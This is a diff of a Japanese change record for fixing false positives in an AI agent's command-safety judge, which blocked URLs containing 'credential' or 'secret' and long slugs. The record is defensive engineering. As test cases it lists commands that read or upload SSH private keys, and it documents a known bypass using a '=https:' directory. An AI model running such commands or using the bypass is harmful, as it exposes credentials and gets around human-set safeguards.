@@ -1,8 +1,8 @@
 # CHG-0032: 判定器と検索・取得の検査が URL を誤検出して調査を止める
 
-- **状態**: Exploring
+- **状態**: In progress
 - **更新日**: 2026-10-23
-- **基準**: 判定器（`home/dot_config/pi/harness/judge/` と `home/dot_claude/hooks/lib/bashrules/`）、`imozuru` と `web-search` のスクリプト。コミット `0573900` 時点
+- **基準**: 判定器（`home/dot_config/pi/harness/judge/` と `home/dot_claude/hooks/lib/bashrules/`）、`imozuru` と `web-search` のスクリプト。コミット `0573900` 時点（実装は未デプロイ。`chezmoi apply` と `pis` の再起動後に実機で確かめる）
 
 ## 目的と非目的
 
@@ -18,36 +18,40 @@
 
 | 段 | 解決したいこと | 内容 | 状態 |
 | --- | --- | --- | --- |
-| 段 1 | どの入力が、なぜ誤検出されるか分からない | 誤検出の入力を集めて再現し、判定器のどの規則（語のヒューリスティックか、パスの glob 照合か）が当たっているかを特定する。TS 版と Python 版の両方 | 未着手 |
-| 段 2 | 直し方の候補が複数ある | 「候補比較」の候補を、再現の結果と、悪用の経路（URL の形をした引数で、保護対象を読めてしまわないか）で評価し、`review` に見せて方式を決める | 未着手 |
-| 段 3 | 判定器の実装 | 選んだ方式を TS 版と Python 版の両方に入れ、正解データ 3 種（decide・policy・checks）を再生成し、試験を足す | 未着手 |
-| 段 4 | 取得・検索のスクリプトの検査 | `fetch.py` と `websearch.py` の「トークンらしき文字列」の検査を、英単語のスラッグを許す形に直す（上流の `imozuru` を vendor したものなので、変更点を `references/upstream.md` に残す） | 未着手 |
-| 段 5 | 仕様に反映する | `docs/spec/pi-decide.md` と `agent-command-policy.md` に、URL の扱いを書く | 未着手 |
+| 段 1 | どの入力が、なぜ誤検出されるか分からない | 誤検出の入力を集めて再現し、判定器のどの規則が当たっているかを特定する | 完了（Python 版で再現。TS 版は正解データの一致で確認） |
+| 段 2 | 直し方の候補が複数ある | 候補を評価し、`review` に見せて方式を決める | 完了（`review` 2 回） |
+| 段 3 | 判定器の実装 | 選んだ方式を TS 版と Python 版の両方に入れ、正解データ 3 種を再生成し、試験を足す | 完了（全件検証の最終確認は「実装・検証」） |
+| 段 4 | 取得・検索のスクリプトの検査 | `web-search` の `check_query` と、`imozuru` の内蔵の代替の「トークンらしき文字列」の検査を、URL の中のスラッグを許す形に直す | 完了 |
+| 段 5 | 仕様に反映する | `docs/spec/agent-command-policy.md` と `web-search.md` に、URL の扱いを書く | 完了 |
+| 段 6 | 実機で確かめる | `chezmoi apply` の後、`pis` で、取れなかった記事（[記録 O1](../research/agents/openshell-comparison.md) の「届かなかったもの」）が取れることを確かめる | 未着手（CHG-0033 の段 P1 で行う） |
 
 状態: 未着手 / 進行中 / 完了 / 保留 / 見送り / 消滅
 
 ## 現在地
 
-**確かめたこと**（2026-10-23。`imozuru` の調査中に起きた。再現はまだしていない）:
+**確かめたこと**（2026-10-23。再現は `.tmp/url_probe.py`、Python 版で実行）:
 
-- `fetch.py` を呼ぶコマンドが、**判定器**に拒否された。文言は「`` `python` のインラインコードがセンシティブなパスを参照しています (egress-proxy-api-credentials-ai-agent-sandboxes) ``」。拒否した規則は `check_interpreter_inline_code`（`home/dot_claude/hooks/lib/bashrules/rules_exec.py:328`、`home/dot_config/pi/harness/judge/rules_exec.ts:258`）で、パスの判定は `sensitive.py` の `sensitive_path_in_command`（150 行）が、引数の**末尾の名前**に `credential`・`secret` などの語（`_SENSITIVE_WORD_RE`）が含まれるかで行う
-- 拒否された入力は、URL（`https://…/egress-proxy-api-credentials-ai-agent-sandboxes` など。末尾が単語のハイフンつなぎ）と、保存名。**URL の末尾の名前が、ファイルの名前として評価された**と読める（推測。段 1 で再現して確かめる）
-- 拒否されたもの: `credentials` を含む記事 1 本、`secret` を含む記事 1 本、`credential` を含む記事 1 本（同じ理由。調査 [記録 O1](../research/agents/openshell-comparison.md) の「届かなかったもの」）
-- `fetch.py` 自身も、別の理由で 3 本を拒否した: 「URL に『長いトークンらしき文字列』らしき文字列が含まれる」。検査は `imozuru_root.py:125` と `websearch.py:208`（同じ検査）。拒否された URL は、`…/2026-09-10-learning-formal-methods-agent-policy` のような、英単語のハイフンつなぎの長いスラッグで、実際のトークンではない（推測。検査の正規表現は未確認）
+- 拒否した規則は `sensitive.py` の `sensitive_path_in_command`（`home/dot_claude/hooks/lib/bashrules/sensitive.py`。TS 版は `judge/sensitive.ts`）。引数の**末尾の名前**に `credential`・`secret` などの語（`_SENSITIVE_WORD_RE`）が含まれるかで判定する。URL の末尾の名前が、ファイルの名前として評価されていた
+- 再現した入力（修正前）: `python3 fetch.py https://…/egress-proxy-api-credentials-ai-agent-sandboxes out.md` と `curl -sL https://…/secrets-management-guide` が、語のヒューリスティックで当たる。`python3 -c "print('https://…/secrets-management-guide')"` は、コード片を空白で分けた断片の末尾（`…guide')`）が当たり、インラインコードの規則（`rules_exec.py` の `check_interpreter_inline_code`）が拒否する。`curl https://example.com/.env` は、確実な証拠の側（`.env`）で当たる（リモートの URL なので誤検出）
+- 本物のパス（`cat ~/.ssh/id_rsa`、`python3 -c "open('/home/u/.ssh/id_rsa')"`、`curl -T ~/.ssh/id_rsa https://…`、`curl file:///home/u/.ssh/id_rsa`）は、修正前から拒否されていた（`curl` は読み取り系の規則の対象外のため、`file://` は判定の関数では当たるが、フック全体では deny にならない。修正前後で同じ）
+- `fetch.py` 側の拒否は、`websearch.py` の `LONG_TOKEN`（40 文字以上の英数字・`-`・`_`・`/`・`=`・`+` の列で、数字と英字を両方含むもの）が、`2026-09-10-learning-formal-methods-agent-policy` のような長いスラッグに当たるため
 
-**影響**: 調査で取れなかった資料が、約 8 本あった。判定器は回避せず（指示どおり）見送った。
+**直した内容**（未デプロイ）:
+
+- 判定器: 各引数から、`http(s)://` で始まる部分（直前が `[\w/.~-]` でないもの。IPv6 `[::1]` を許し、空白・引用符・`)` `>` `,` `[` `]` の手前まで）を除いてから検査する。`./https://host/.ssh/id_rsa`、`~/https://host/.env`、`file://…`、`https://a,~/.ssh/id_rsa` は除かない。仕様は [agent-command-policy](../spec/agent-command-policy.md) の「引数の URL はパスとして判定しない」
+- 検査: 長いトークンの数えから、**URL の中の**、英小文字の語（20 文字まで）と数字（8 桁まで）だけを `-` `_` `/` でつないだ 4 部分以上の区切り（スラッグ）を除く。URL の外では従来どおり。仕様は [web-search](../spec/web-search.md)
 
 ## 未解決点
 
-1. 誤検出は、URL がパスとして検査されたためか。それとも、コマンド全体の文字列から語が拾われたためか（段 1 で再現する）
-2. `http(s)://` の引数を、パスの判定から除くと、悪用の経路が生じないか。例: `file://` の URL、`curl -T <ファイル> <URL>`（ファイルの引数は別に検査される）、URL の形を装ったローカルのパス。**再開条件**: 段 1 の再現の後
-3. 「トークンらしき文字列」の検査を、英単語のスラッグを許す形に緩めても、実際のトークン（`sk-…`、`ghp_…`、JWT、AWS のキー）を漏らさないか。**再開条件**: 検査の正規表現の確認と、実際のトークンの形の試験
-4. 両実装（TS と Python）と、正解データ 3 種の同期の手間（直す範囲が大きくなると、`review` の回数も増える）
+1. **既知の限界**: `--url=https://…` のように `=` の直後の URL も除くので、`=https:` という名前のディレクトリを作って保護対象を読む形は見逃す。事故防止の水準（[ADR-0012](../adr/0012-ocs-boundary-for-accidents.md)）では、そのディレクトリを作る必要があり、実質の穴ではないとして許容した（`review` の MINOR）
+2. **既知の限界**: URL の中の、語をつないだ長い小文字のパスフレーズ（`correct-horse-battery-staple-…`）は、検査を通る。URL の外では止まる。許容の判断は、実際に URL へ秘密を埋める事故が起きにくいこと（`review` の MAJOR に対し、URL の中に限定する形で対処）
+3. 実機（`chezmoi apply` 後の `pis`）で、取れなかった記事が取れるか。**再開条件**: CHG-0033 の段 P1 の再調査
+4. TS 版は、Python 版と同じ正規表現を `pyRegex` で写した。Unicode の `\w` の境界での食い違いは、正解データには無く、直接は試験していない
 
 ## 次の調査・実験
 
-- 誤検出の入力を集める（上の URL と、`imozuru`・`web-search` で使う典型の URL）。判定器に渡して、どの規則が当たるかを、TS 版と Python 版の両方で確かめる（段 1）
-- 判定器の試験の足場（`scripts/agents/export_*_golden.py`、`test/agents/test_pi_judge_ts.py`）で、URL の引数を含む入力を足して、現状の結果を固定する
+- 実機で、段 6（上の実施計画）を行う
+- `.tmp/url_probe.py`（使い捨て）の入力のうち、価値のあるものがあれば、`test/agents/` に取り込む（現状は、同じ入力を `test_check_bash_sensitive.py` と正解データに入れた）
 
 ## 評価基準
 
@@ -56,7 +60,7 @@
 1. 本物のセンシティブなパスの拒否が、現状と同じ（既存の正解データの拒否のケースがすべて同じ結果）
 2. 上の誤検出の入力が通る（URL の末尾に `credential`・`secret` を含む記事、長い英単語のスラッグ）
 3. TS 版と Python 版が、同じ入力に同じ結果を返す（正解データ 3 種で固定）
-4. 実際のトークンの形（`sk-…`、`ghp_…`、JWT、AWS のキー）は、引き続き拒否される
+4. 実際のトークンの形（`sk-…`、`ghp_…`、JWT、AWS のキー、大文字混じり、`=` 付き、16 進）は、引き続き拒否される
 5. `review` を経る（判定器に触るため）
 
 **望ましい**: 誤検出の頻度を測る（ログがあれば）。
@@ -65,11 +69,12 @@
 
 | 候補 | 支持する根拠 | 不利な点・反証 | 未検証点 | 扱い | 次の確認 |
 | --- | --- | --- | --- | --- | --- |
-| A: `http(s)://` で始まる引数を、パスの判定から除く（`file://` は除かない） | 実装が小さい。URL はローカルのパスではない | URL の形を装ったローカルのパスを見逃さないか | 悪用の経路の洗い出し | 有望（暫定） | 段 1 の再現、`review` |
-| B: URL の末尾の名前にだけ、語のヒューリスティックを適用しない（パスの glob 照合は URL にも適用） | 保護対象のディレクトリの名前が URL に含まれる場合は引き続き止まる | URL の末尾に `.env` などを含む場合の扱い | URL でパスの glob が当たる実例 | 未評価 | 実例の収集 |
-| C: 取得専用のスクリプト（`fetch.py`・`websearch.py`）の引数だけ、除外する | 変更の範囲が狭い | `curl`・`wget` など、ほかの取得コマンドで同じ誤検出が出る | — | 保留 | A の評価の後 |
+| A: `http(s)://` の部分を、パスの判定から除く（`file://` は除かない）。除く位置は、直前が `[\w/.~-]` でないものに限る | 実装が小さい。URL はローカルのパスではない。`review`（設計・実装の 2 回）の指摘で、ローカルのパスに混ざる URL 風の文字列は除かない形に絞った | `=` の直後の URL は除く（許容） | Unicode の境界の食い違い | **採用** | 実機 |
+| B: URL の末尾の名前にだけ、語のヒューリスティックを適用しない（パスの glob 照合は URL にも適用） | 保護対象のディレクトリの名前が URL に含まれる場合は引き続き止まる | `curl https://example.com/.env` のような、確実な証拠の側の誤検出が残る | — | 見送り（A で足りる） | — |
+| C: 取得専用のスクリプト（`fetch.py`・`websearch.py`）の引数だけ、除外する | 変更の範囲が狭い | `curl`・`wget` など、ほかの取得コマンドで同じ誤検出が出る | — | 見送り | — |
 | D: URL を短縮して避ける | 判定器を変えない | 調査の質が下がる。短縮サービスへ送る内容が増える | — | 見送り | — |
-| E（取得・検索の検査）: 英小文字・数字・ハイフンだけで、3 語以上のハイフンつなぎは、スラッグとして許し、32 文字以上の単一の英数字の列は、引き続き拒否する | スラッグを通し、実際のトークンの形は止まる | 長い単語のスラッグに、トークンの断片が混ざる場合 | 実際のトークンの形での試験 | 有望（暫定） | 段 4 の試験 |
+| E（取得・検索の検査）: URL の中の、英小文字・数字だけのスラッグを、長さの数えから除く | スラッグを通し、実際のトークンの形は止まる。URL の中に限定し、各部分の長さに上限を付けた（`review` の MAJOR への対処） | URL の中の、語をつないだ小文字のパスフレーズは通る | — | **採用** | 実機 |
+| E'（取得・検索の検査）: URL の内外を問わずスラッグを除く | 実装が小さい | 語をつないだパスフレーズが通る（`review` の MAJOR） | — | 見送り | — |
 
 扱い: 未評価 / 検証中 / 有望 / 採用 / 保留 / 見送り
 
@@ -77,13 +82,18 @@
 
 | 変更対象 | 変更前 → 変更後 | 理由・証拠 | 適用結果 |
 | --- | --- | --- | --- |
-| `docs/spec/pi-decide.md` と `docs/spec/agent-command-policy.md` の「センシティブなパスの検出」 | URL の扱いを書いていない → `http(s)://` の URL は、ローカルのパスとして判定しない、と書く（方式の確定後） | 現在地の誤検出 | 未適用 |
-| `home/dot_claude/skills/imozuru/references/upstream.md` と `web-search` の仕様 | 「トークンらしき文字列」の検査 → スラッグを許す（段 4 の後） | 現在地 | 未適用 |
+| `docs/spec/agent-command-policy.md` の「センシティブパスの判定を 2 段に分ける」 | URL の扱いを書いていない → 「引数の URL はパスとして判定しない」の節を足した | 現在地の誤検出 | 適用済み |
+| `docs/spec/web-search.md` の秘匿チェック | 長いトークンらしき文字列 → URL の中のスラッグを数えから除く、と書いた | 現在地 | 適用済み |
 
 ## 実装・検証
 
-未着手。方針: 判定器に触るので、**TS 版と Python 版の両方、正解データ 3 種（`scripts/agents/export_{decide,policy,checks}_golden.py`）の再生成、全件検証、`review` を必ず行う**（既存の運用。[pi-decide](../spec/pi-decide.md)）。
+- 実装: `sensitive.py`（`_URL_RE`）、`sensitive.ts`（`URL_RE`）、`websearch.py`（`is_slug`・`check_query`）、`imozuru_root.py`（内蔵の代替 `_is_slug`・`secret_reason`）
+- 試験: `test/agents/test_check_bash_sensitive.py`（URL の節）、`test/test_websearch.py`、`test/test_imozuru.py`。正解データ 3 種を再生成した（追加のみ。checks +160、decide +55、policy +89 行。既存の行の変更なし）
+- `review` 2 回: 設計（`./https://…` を消す MAJOR を取り入れ）と実装（スラッグの緩和が語をつないだパスフレーズを通す MAJOR を、URL の中に限定して取り入れ、`=https://` の MINOR は許容）
+- **途中で見つけた試験の弱点**: `test_review_child_may_read_a_revision_with_git` は、`git diff` の出力に「どの規則にも当たらない」が入ると失敗する（正解データの差分に、この文言が入るため）。出力全体ではなく、拒否の形（`tool error: guarded_bash: …`）だけを見る形に直した
+- **不安定だった試験**: `test_pi_commit_confirm.py` の TUI の試験が、並列実行の負荷時に固定の `sleep` で落ちた（単体では通る。この案件の変更とは無関係）。画面を見ながら待つ形に直した
 
 ## 重要な更新
 
 - **2026-10-23**: 起票。`imozuru` の調査（[記録 O1](../research/agents/openshell-comparison.md)）で、URL に `credential`・`secret` を含む記事と、長い英単語のスラッグの URL が取れなかった。利用者の指示で、判定器の誤検出の除去と再調査を、コンパクト化の後に再開する。
+- **2026-10-23**: 段 1〜5 を実装。方式は「A（URL の部分を除く）と E（スラッグを長さの数えから除く）」。`review` の MAJOR 2 件（ローカルのパスに混ざる URL 風の文字列を消す、語をつないだパスフレーズを通す）を取り入れ、除く条件を絞った。
